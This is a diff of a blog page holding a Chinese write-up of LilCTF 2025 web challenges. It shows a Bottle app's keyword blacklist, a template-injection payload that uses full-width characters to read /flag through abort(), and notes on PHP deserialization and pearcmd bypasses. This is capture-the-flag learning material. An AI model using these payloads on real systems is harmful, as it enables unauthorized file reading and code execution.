@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" ez_bottle 考点：abort回显+全角字符绕过open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # 提示：flag在/flag路径下，可以尝试获取 # 上传文件存储目录 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # 确保上传目录存在 os.makedirs(UPLOAD_DIR, exist_ok=True) # 静态文件目录 STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # 最大文件大小限制（1MB） MAX_FILE_SIZE = 1 * 1024 * 1024 # 黑名单关键词，防止恶意代码 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单关键词&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;检查zip条目是否是符号链接&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;检查目标路径是否在基础目录内（防止路径遍历攻击）&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;返回首页&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;提供静态文件服务&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;返回上传页面&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; # 获取上传的zip文件 zip_file = request.files.get(&#39;file&#39;) # 检查是否是zip文件 if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;无效文件，请上传ZIP文件。&#39; # 检查文件大小 if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;文件大小超过1MB限制，请上传更小的文件。&#39; zip_file.file.seek(0) # 生成唯一目录名 current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # 保存zip文件 zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # 检查是否包含符号链接 if is_symlink(file_info): return &#39;不允许包含符号链接。&#39; # 检查路径安全性 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;检测到路径遍历攻击。&#39; # 解压文件 z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;无效的ZIP文件。&#39; # 获取解压后的文件列表 files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # 返回文件列表和访问链接 return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;查看上传的文件内容&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;文件未找到。&#34; # 读取文件内容 with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # 检查黑名单内容 if contains_blacklist(content): return &#34;检测到恶意内容！禁止访问！！！&#34; try: # 渲染文件内容（注意：这里使用模板渲染可能存在安全隐患） return template(content) except Exception as e: return f&#34;渲染模板出错: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404错误处理&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403错误处理&#34;&#34;&#34; return &#34;禁止访问：您没有权限访问此资源。&#34; if __name__ == &#39;__main__&#39;: # 启动web服务 run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目逻辑很简答，构造一个文件上传上传一个zip，zip里文件内容会被渲染，主要是怎么绕过waf。这题代码没给全，我本地测总是被404处理，非常难受，不知道是无回显还是回显，不过根据我之前打bottle的题目，打的是abort回显，\n">
 <title>2025-LilCTF</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-LilCTF">
 <meta property='og:description' content=" ez_bottle 考点：abort回显+全角字符绕过open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # 提示：flag在/flag路径下，可以尝试获取 # 上传文件存储目录 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # 确保上传目录存在 os.makedirs(UPLOAD_DIR, exist_ok=True) # 静态文件目录 STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # 最大文件大小限制（1MB） MAX_FILE_SIZE = 1 * 1024 * 1024 # 黑名单关键词，防止恶意代码 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单关键词&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;检查zip条目是否是符号链接&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;检查目标路径是否在基础目录内（防止路径遍历攻击）&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;返回首页&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;提供静态文件服务&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;返回上传页面&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; # 获取上传的zip文件 zip_file = request.files.get(&#39;file&#39;) # 检查是否是zip文件 if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;无效文件，请上传ZIP文件。&#39; # 检查文件大小 if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;文件大小超过1MB限制，请上传更小的文件。&#39; zip_file.file.seek(0) # 生成唯一目录名 current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # 保存zip文件 zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # 检查是否包含符号链接 if is_symlink(file_info): return &#39;不允许包含符号链接。&#39; # 检查路径安全性 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;检测到路径遍历攻击。&#39; # 解压文件 z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;无效的ZIP文件。&#39; # 获取解压后的文件列表 files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # 返回文件列表和访问链接 return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;查看上传的文件内容&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;文件未找到。&#34; # 读取文件内容 with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # 检查黑名单内容 if contains_blacklist(content): return &#34;检测到恶意内容！禁止访问！！！&#34; try: # 渲染文件内容（注意：这里使用模板渲染可能存在安全隐患） return template(content) except Exception as e: return f&#34;渲染模板出错: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404错误处理&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403错误处理&#34;&#34;&#34; return &#34;禁止访问：您没有权限访问此资源。&#34; if __name__ == &#39;__main__&#39;: # 启动web服务 run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目逻辑很简答，构造一个文件上传上传一个zip，zip里文件内容会被渲染，主要是怎么绕过waf。这题代码没给全，我本地测总是被404处理，非常难受，不知道是无回显还是回显，不过根据我之前打bottle的题目，打的是abort回显，\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-lilctf/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-08-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-15T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-LilCTF">
 <meta name="twitter:description" content=" ez_bottle 考点：abort回显+全角字符绕过open 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # 提示：flag在/flag路径下，可以尝试获取 # 上传文件存储目录 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) # 确保上传目录存在 os.makedirs(UPLOAD_DIR, exist_ok=True) # 静态文件目录 STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) # 最大文件大小限制（1MB） MAX_FILE_SIZE = 1 * 1024 * 1024 # 黑名单关键词，防止恶意代码 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单关键词&#34;&#34;&#34; return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): &#34;&#34;&#34;检查zip条目是否是符号链接&#34;&#34;&#34; return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): &#34;&#34;&#34;检查目标路径是否在基础目录内（防止路径遍历攻击）&#34;&#34;&#34; return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;返回首页&#34;&#34;&#34; return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): &#34;&#34;&#34;提供静态文件服务&#34;&#34;&#34; return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;返回上传页面&#34;&#34;&#34; return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; # 获取上传的zip文件 zip_file = request.files.get(&#39;file&#39;) # 检查是否是zip文件 if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;无效文件，请上传ZIP文件。&#39; # 检查文件大小 if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;文件大小超过1MB限制，请上传更小的文件。&#39; zip_file.file.seek(0) # 生成唯一目录名 current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) # 保存zip文件 zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): # 检查是否包含符号链接 if is_symlink(file_info): return &#39;不允许包含符号链接。&#39; # 检查路径安全性 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;检测到路径遍历攻击。&#39; # 解压文件 z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;无效的ZIP文件。&#39; # 获取解压后的文件列表 files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) # 返回文件列表和访问链接 return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): &#34;&#34;&#34;查看上传的文件内容&#34;&#34;&#34; file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;文件未找到。&#34; # 读取文件内容 with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() # 检查黑名单内容 if contains_blacklist(content): return &#34;检测到恶意内容！禁止访问！！！&#34; try: # 渲染文件内容（注意：这里使用模板渲染可能存在安全隐患） return template(content) except Exception as e: return f&#34;渲染模板出错: {str(e)}&#34; @error(404) def error404(error): &#34;&#34;&#34;404错误处理&#34;&#34;&#34; return &#34;bbbbbboooottle&#34; @error(403) def error403(error): &#34;&#34;&#34;403错误处理&#34;&#34;&#34; return &#34;禁止访问：您没有权限访问此资源。&#34; if __name__ == &#39;__main__&#39;: # 启动web服务 run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目逻辑很简答，构造一个文件上传上传一个zip，zip里文件内容会被渲染，主要是怎么绕过waf。这题代码没给全，我本地测总是被404处理，非常难受，不知道是无回显还是回显，不过根据我之前打bottle的题目，打的是abort回显，\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -704,10 +704,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% f</span><span class="s1">rom bottle import abort
+</span></span></span><span class="line"><span class="cl"><span class="si">% f</span><span class="s1">rom bottle import abort
 </span></span></span><span class="line"><span class="cl"><span class="s1">% ａ = ｏｐｅｎ(&#39;/flag&#39;).read()
-</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% a</span><span class="s1">bort(404, a)
-</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">% e</span><span class="s1">nd
+</span></span></span><span class="line"><span class="cl"><span class="si">% a</span><span class="s1">bort(404, a)
+</span></span></span><span class="line"><span class="cl"><span class="si">% e</span><span class="s1">nd
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -795,10 +795,10 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#39;&#39;&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% f</span><span class="s2">rom bottle import abort
+</span></span></span><span class="line"><span class="cl"><span class="si">% f</span><span class="s2">rom bottle import abort
 </span></span></span><span class="line"><span class="cl"><span class="s2">% ａ = ｏｐｅｎ(&#39;/flag&#39;).read()
-</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% a</span><span class="s2">bort(404, a)
-</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">% e</span><span class="s2">nd
+</span></span></span><span class="line"><span class="cl"><span class="si">% a</span><span class="s2">bort(404, a)
+</span></span></span><span class="line"><span class="cl"><span class="si">% e</span><span class="s2">nd
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
 </span></span><span class="line"><span class="cl">
@@ -928,7 +928,7 @@
 </span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span><span class="c1">#(这里弱比较给username赋值0也行)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -955,7 +955,7 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$ser</span><span class="p">,</span> <span class="s1">&#39;Access&#34;:&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">exit</span> <span class="p">(</span><span class="s2">&#34;no way!!!!&#34;</span><span class="p">);</span><span class="c1">#（wp说利用 PHP 类名大小写不敏感绕过Access，但是这里是&amp;&amp;，我admin绕过了后面就不需要绕了）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;nonono!!!&#34;</span><span class="p">);</span>
@@ -1144,9 +1144,9 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">题目作者改后</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">username强</span><span class="o">==</span><span class="n">admin</span><span class="p">,</span><span class="err">无伤大雅，一样直接绕，还加了一个</span><span class="n">if检测S</span><span class="p">:,</span><span class="err">没什么用，因为$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">value是序列化的Access</span><span class="err">，而其中并没有</span><span class="n">S</span><span class="p">:</span><span class="err">。</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">作者后面还改了一下变为$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">prefix</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s1">&#39;lilctf&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">suffix</span><span class="p">.</span><span class="err">‘</span><span class="n">php</span><span class="err">’，这就有点麻烦了，这就必须按照作者的想法打</span><span class="n">pearcmd文件包含</span><span class="err">，但是复现环境没加</span><span class="n">php</span><span class="err">，但是接下来我们还是用</span><span class="n">pearcmd打打</span><span class="err">（因为复现环境</span><span class="n">flag在</span><span class="o">/</span><span class="n">readflag</span><span class="err">，前面的打法拿不到</span><span class="n">flag</span><span class="err">），由于</span><span class="n">pearcmd过滤了就用peclcmd代替</span><span class="err">。</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">最后就是</span><span class="n">strpos改成stripos而且</span><span class="o">&amp;&amp;</span><span class="err">变为了</span><span class="o">||</span><span class="err">，大小写绕不过，那就用利用不完整类来让</span><span class="o">`</span><span class="n">__PHP_Incomplete_Class_Name</span><span class="o">`</span><span class="w"> </span><span class="err">的成员变为类名</span><span class="p">,</span><span class="w"> </span><span class="err">这样也会让两次反序列化结果不一致</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">username强</span><span class="o">==</span><span class="n">admin</span><span class="p">,</span><span class="err">无伤大雅，一样直接绕，还加了一个</span><span class="n">if检测S</span><span class="p">:,</span><span class="err">没什么用，因为$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">value是序列化的Access</span><span class="err">，而其中并没有</span><span class="n">S</span><span class="p">:</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">作者后面还改了一下变为$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">prefix</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s1">&#39;lilctf&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">suffix</span><span class="p">.</span><span class="err">‘</span><span class="n">php</span><span class="err">’，这就有点麻烦了，这就必须按照作者的想法打</span><span class="n">pearcmd文件包含</span><span class="err">，但是复现环境没加</span><span class="n">php</span><span class="err">，但是接下来我们还是用</span><span class="n">pearcmd打打</span><span class="err">（因为复现环境</span><span class="n">flag在</span><span class="o">/</span><span class="n">readflag</span><span class="err">，前面的打法拿不到</span><span class="n">flag</span><span class="err">），由于</span><span class="n">pearcmd过滤了就用peclcmd代替</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">最后就是</span><span class="n">strpos改成stripos而且</span><span class="o">&amp;&amp;</span><span class="err">变为了</span><span class="o">||</span><span class="err">，大小写绕不过，那就用利用不完整类来让</span><span class="o">`</span><span class="n">__PHP_Incomplete_Class_Name</span><span class="o">`</span><span class="w"> </span><span class="err">的成员变为类名</span><span class="p">,</span><span class="w"> </span><span class="err">这样也会让两次反序列化结果不一致</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250906171043037.png" alt="image-20250906171043037" style="zoom:50%;" />
@@ -1241,7 +1241,7 @@
 <p><img src="/p/2025-lilctf/image-20250906173946768.png"
 	width="1917"
 	height="300"
-	srcset="/p/2025-lilctf/image-20250906173946768_hu_478cffeed26ecfcc.png 480w, /p/2025-lilctf/image-20250906173946768_hu_9c6876bcc9051380.png 1024w"
+	srcset="/p/2025-lilctf/image-20250906173946768_hu_1697b522921c2ad9.png 480w, /p/2025-lilctf/image-20250906173946768_hu_4b380aed8b81d6aa.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250906173946768"
@@ -1899,7 +1899,7 @@
 <p><img src="/p/2025-lilctf/image-20250905174518319.png"
 	width="1579"
 	height="412"
-	srcset="/p/2025-lilctf/image-20250905174518319_hu_3ea5a8398c469f43.png 480w, /p/2025-lilctf/image-20250905174518319_hu_607ebca358e4c31d.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905174518319_hu_9df06c0e2f298ef2.png 480w, /p/2025-lilctf/image-20250905174518319_hu_4252ce60771aaf69.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905174518319"
@@ -1914,7 +1914,7 @@
 <p><img src="/p/2025-lilctf/image-20250905175023405.png"
 	width="866"
 	height="150"
-	srcset="/p/2025-lilctf/image-20250905175023405_hu_a305c0e090a52ce.png 480w, /p/2025-lilctf/image-20250905175023405_hu_4afeca8aef292b5d.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905175023405_hu_e0b7f989b7061ef6.png 480w, /p/2025-lilctf/image-20250905175023405_hu_b3d3c972e8fe2e59.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905175023405"
@@ -1980,7 +1980,7 @@
 <p><img src="/p/2025-lilctf/image-20250905194656667.png"
 	width="1568"
 	height="903"
-	srcset="/p/2025-lilctf/image-20250905194656667_hu_dcfea0a6c6b6d4ff.png 480w, /p/2025-lilctf/image-20250905194656667_hu_ba33fb9fe2c1fc00.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905194656667_hu_14678a2e3fd324ba.png 480w, /p/2025-lilctf/image-20250905194656667_hu_a8d9659150fa0e0.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905194656667"
@@ -2088,7 +2088,7 @@
 <p><img src="/p/2025-lilctf/image-20250905200320027.png"
 	width="1457"
 	height="455"
-	srcset="/p/2025-lilctf/image-20250905200320027_hu_3a01888d4de0fb91.png 480w, /p/2025-lilctf/image-20250905200320027_hu_cb6c17ff9892b128.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905200320027_hu_bade14794da2a662.png 480w, /p/2025-lilctf/image-20250905200320027_hu_734f9de7c2badbdc.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905200320027"
@@ -2144,7 +2144,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250905204905269.png"
 	width="1104"
 	height="389"
-	srcset="/p/2025-lilctf/image-20250905204905269_hu_400f17b53140a08a.png 480w, /p/2025-lilctf/image-20250905204905269_hu_2c4c0da18b6c0228.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905204905269_hu_39db6e696561a1f5.png 480w, /p/2025-lilctf/image-20250905204905269_hu_be9a8cc0264c3430.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905204905269"
@@ -2167,7 +2167,7 @@
 </div><p><img src="/p/2025-lilctf/image-20250905212859767.png"
 	width="1174"
 	height="192"
-	srcset="/p/2025-lilctf/image-20250905212859767_hu_192a01582a46669c.png 480w, /p/2025-lilctf/image-20250905212859767_hu_573c275f0698b2b3.png 1024w"
+	srcset="/p/2025-lilctf/image-20250905212859767_hu_7eea34873e3d85bc.png 480w, /p/2025-lilctf/image-20250905212859767_hu_378540efa4d0406a.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250905212859767"
@@ -2184,7 +2184,7 @@
 <p><img src="/p/2025-lilctf/image-20250906223016195.png"
 	width="1160"
 	height="611"
-	srcset="/p/2025-lilctf/image-20250906223016195_hu_bb6db73b01ce3e76.png 480w, /p/2025-lilctf/image-20250906223016195_hu_678ad01ebe13556d.png 1024w"
